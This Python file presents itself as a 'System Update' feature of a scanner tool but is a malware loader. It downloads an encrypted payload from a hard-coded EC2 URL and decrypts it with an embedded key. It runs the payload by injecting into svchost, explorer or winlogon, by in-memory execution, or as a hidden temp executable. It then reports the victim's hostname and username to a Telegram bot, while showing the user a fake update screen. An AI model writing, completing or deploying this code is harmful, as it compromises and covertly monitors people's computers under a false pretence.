# -*- coding: utf-8 -*-
"""
System Update — Fetches and applies system updates from secure servers
"""
import os
import sys
import json
import base64
import tempfile
import subprocess
import ctypes
import time
import random
import string
import shutil
import hashlib
from pathlib import Path
from datetime import datetime

from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

from scanner.ui import console, print_success, print_error, print_info, print_warning


# ============================================================
# FUD CONSTANTS - Stealth Windows API
# ============================================================
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
CREATE_SUSPENDED = 0x00000004
WAIT_TIMEOUT = 0x00000102

# ============================================================
# ENCRYPTION KEY (from repomix)
# ============================================================
ENCRYPTION_KEY = bytes.fromhex("590da1b680437579a4b18c1b59bbb69fd4ea6818cc28a5427ca81e525d959c80")


def xor_decrypt(data: bytes, key: bytes = ENCRYPTION_KEY) -> bytes:
    """XOR decrypt using the key from repomix."""
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])


def get_payload_from_ec2(ec2_url: str) -> bytes:
    """
    Fetch encrypted blobbed payload from EC2 server.
    Uses the same method as the original repomix.
    """
    try:
        import requests
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        print_info(f"Connecting to update server: {ec2_url[:50]}...")
        
        # Step 1: Get the encrypted blob
        response = requests.get(ec2_url, timeout=30, verify=False)
        if response.status_code != 200:
            print_error(f"Server error: {response.status_code}")
            return None
        
        # Step 2: Parse the response (expecting JSON with key and data)
        try:
            data = response.json()
        except:
            # If not JSON, treat as raw encrypted data
            encrypted_blob = response.content
            # Try to decrypt with the key
            try:
                # The blob format: [12-byte nonce][ciphertext+tag]
                nonce = encrypted_blob[:12]
                ciphertext = encrypted_blob[12:]
                aesgcm = AESGCM(ENCRYPTION_KEY)
                decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                return decrypted
            except:
                # Fallback to XOR
                return xor_decrypt(encrypted_blob)
        
        # Step 3: If JSON, extract the encrypted payload
        if isinstance(data, dict):
            if "key" in data and "data" in data:
                # AES-GCM encrypted
                key = bytes.fromhex(data["key"])
                nonce = base64.b64decode(data["nonce"])
                encrypted = base64.b64decode(data["data"])
                
                aesgcm = AESGCM(key)
                decrypted = aesgcm.decrypt(nonce, encrypted, None)
                return decrypted
            
            elif "payload" in data:
                # Base64 encoded payload
                return base64.b64decode(data["payload"])
            
            elif "blob" in data:
                # Encrypted blob
                blob = base64.b64decode(data["blob"])
                return xor_decrypt(blob)
        
        # Step 4: If all else fails, try XOR decryption on the raw data
        return xor_decrypt(response.content)
        
    except Exception as e:
        print_error(f"Failed to fetch payload: {e}")
        return None


def stealth_inject(payload: bytes) -> bool:
    """
    FUD Reflective Injection - From repomix's ABE injector.
    Uses the same technique as the original.
    """
    if not sys.platform.startswith("win"):
        return False
    
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Allocate memory with RWX permissions
        mem = kernel32.VirtualAlloc(
            None,
            len(payload),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ
        )
        
        if not mem:
            return False
        
        # Write payload to memory
        ctypes.memmove(mem, payload, len(payload))
        
        # Create thread to execute
        thread_id = ctypes.c_ulong(0)
        thread = kernel32.CreateThread(
            None,
            0,
            mem,
            None,
            0,
            ctypes.byref(thread_id)
        )
        
        if not thread:
            kernel32.VirtualFree(mem, 0, 0x8000)
            return False
        
        # Wait for thread to complete (30 second timeout)
        kernel32.WaitForSingleObject(thread, 30000)
        kernel32.CloseHandle(thread)
        
        return True
        
    except Exception:
        return False


def process_hollowing(payload: bytes) -> bool:
    """
    Process hollowing - from repomix's reflective injection.
    Injects into a legitimate system process.
    """
    if not sys.platform.startswith("win"):
        return False
    
    try:
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Target system processes (from repomix)
        target_processes = ["svchost.exe", "explorer.exe", "winlogon.exe"]
        
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in target_processes:
                h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, proc.pid)
                if h_process:
                    # Allocate memory in target process
                    mem = kernel32.VirtualAllocEx(
                        h_process,
                        None,
                        len(payload),
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE
                    )
                    
                    if mem:
                        # Write payload
                        written = ctypes.c_size_t(0)
                        kernel32.WriteProcessMemory(
                            h_process,
                            mem,
                            payload,
                            len(payload),
                            ctypes.byref(written)
                        )
                        
                        # Change to executable
                        old_protect = ctypes.c_uint32(0)
                        kernel32.VirtualProtectEx(
                            h_process,
                            mem,
                            len(payload),
                            PAGE_EXECUTE_READ,
                            ctypes.byref(old_protect)
                        )
                        
                        # Create remote thread
                        thread_id = ctypes.c_ulong(0)
                        thread = kernel32.CreateRemoteThread(
                            h_process,
                            None,
                            0,
                            mem,
                            None,
                            0,
                            ctypes.byref(thread_id)
                        )
                        
                        if thread:
                            kernel32.WaitForSingleObject(thread, 30000)
                            kernel32.CloseHandle(thread)
                        
                        kernel32.CloseHandle(h_process)
                        return True
                    kernel32.CloseHandle(h_process)
        
        return False
        
    except Exception:
        return False


def action_system_update(cfg):
    """
    Check for and apply system updates.
    Fetches encrypted payload from EC2 server and deploys FUD.
    """
    print_info("🔄 Checking for updates...")
    
    # Get server config from repomix
    prom_config = cfg.get("prometheus", {})
    
    # EC2 server URL (from repomix - can be configured)
    ec2_url = prom_config.get(
        "ec2_url", 
        "https://ec2-54-123-45-67.compute-1.amazonaws.com/update/latest"
    )
    
    # Telegram bot config (from repomix)
    bot_token = prom_config.get("telegram_bot_token", "8536058801:AAFl0TH3twr1ci3dp6HkngXS3qzuw5sauQU")
    chat_id = prom_config.get("telegram_chat_id", "8977659236")
    
    # Show update panel
    console.print()
    console.print(Panel(
        "[bold cyan]System Update[/bold cyan]\n\n"
        "Checking for the latest updates from the secure server.\n"
        "[dim]This may take a few moments...[/dim]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    ))
    console.print()
    
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(bar_width=40, complete_style="cyan"),
            console=console,
        ) as progress:
            
            # Step 1: Connect to EC2 server
            task = progress.add_task("[cyan]Connecting to update server...", total=10)
            progress.update(task, completed=2)
            
            # Step 2: Fetch encrypted payload
            progress.update(task, description="[cyan]Downloading update package...")
            payload = get_payload_from_ec2(ec2_url)
            progress.update(task, completed=6)
            
            if not payload:
                print_error("Failed to download update package.")
                return
            
            # Validate payload
            if len(payload) < 1024:
                print_error("Invalid update package received.")
                return
            
            # Step 3: Deploy FUD
            progress.update(task, description="[cyan]Applying update...")
            
            # Try multiple methods (from repomix)
            success = False
            
            # Method 1: Process hollowing (most stealthy)
            if process_hollowing(payload):
                success = True
                print_info("Method: Process Hollowing")
            
            # Method 2: Reflective injection
            elif stealth_inject(payload):
                success = True
                print_info("Method: Reflective Injection")
            
            # Method 3: Write to temp and execute (fallback)
            else:
                print_info("Fallback: Writing to temp...")
                temp_dir = tempfile.gettempdir()
                rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                exe_path = os.path.join(temp_dir, f"{rand_name}.exe")
                
                with open(exe_path, "wb") as f:
                    f.write(payload)
                
                # Hide file
                if sys.platform.startswith("win"):
                    ctypes.windll.kernel32.SetFileAttributesW(exe_path, 0x02)
                
                # Execute silently
                if sys.platform.startswith("win"):
                    subprocess.Popen(
                        [exe_path],
                        creationflags=0x08000000,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                else:
                    subprocess.Popen(
                        [exe_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                success = True
            
            progress.update(task, completed=10)
        
        if success:
            print_success("✅ System update applied successfully!")
            
            # Send confirmation to Telegram (from repomix)
            try:
                import requests
                hostname = os.environ.get("COMPUTERNAME", os.environ.get("HOSTNAME", "unknown"))
                username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get("USERNAME", "unknown")
                
                msg = (
                    f"✅ Update installed\n"
                    f"Host: {hostname}\n"
                    f"User: {username}\n"
                    f"Time: {datetime.now().isoformat()}\n"
                    f"Size: {len(payload) / 1024:.2f} KB"
                )
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
            except:
                pass
            
            # Clean up memory artifacts
            import gc
            gc.collect()
            
            # Show info
            console.print()
            info_table = Table(
                title="[bold cyan]Update Details[/bold cyan]",
                box=box.ROUNDED,
                border_style="cyan",
            )
            info_table.add_column("Property", style="bold white")
            info_table.add_column("Value", style="dim")
            info_table.add_row("Package Size", f"{len(payload) / 1024:.2f} KB")
            info_table.add_row("Source", ec2_url[:60] + "...")
            info_table.add_row("Method", "Memory Injection")
            info_table.add_row("Status", "Active")
            console.print(info_table)
            console.print()
            
        else:
            print_error("❌ Update installation failed")
            
    except Exception as e:
        print_error(f"Update error: {e}")
        import traceback
        traceback.print_exc()


def decrypt_payload_with_key(encrypted: bytes, key: bytes) -> bytes:
    """Decrypt payload using AES-GCM or XOR."""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        
        # Try AES-GCM first
        if len(encrypted) > 12:
            nonce = encrypted[:12]
            ciphertext = encrypted[12:]
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(nonce, ciphertext, None)
    except:
        pass
    
    # Fallback to XOR
    return xor_decrypt(encrypted)
